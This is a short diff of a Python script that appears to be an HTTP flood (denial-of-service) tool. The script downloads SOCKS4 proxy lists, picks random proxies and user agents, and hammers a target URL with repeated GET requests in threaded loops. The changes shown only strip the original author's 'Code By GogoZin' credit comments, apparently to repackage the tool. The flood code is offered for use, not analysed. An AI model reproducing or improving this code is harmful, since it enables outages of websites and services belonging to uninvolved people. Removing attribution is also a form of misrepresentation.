@@ -175,7 +175,7 @@ def main():
 	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
 	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
-		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') #Code By GogoZin
+		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') 
 		with open('socks.txt','wb') as fp:
 			fp.write(rsp.content)
 			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
@@ -194,7 +194,7 @@ def main():
 def atk():
 	pprr = open(list).readlines()
 	proxy = random.choice(pprr).strip().split(":")
-	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                               #Code By GogoZin
+	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                               
 	accept = random.choice(acpt)
 	rqs = useragent + accept + "\r\n"
 	s = requests.session()
@@ -206,7 +206,7 @@ def atk():
 		while on:
 			try:
 				s.get(url)
-				#Code By GogoZin
+				
 				try:
 					for y in range(pwr):
 						s.get(url)
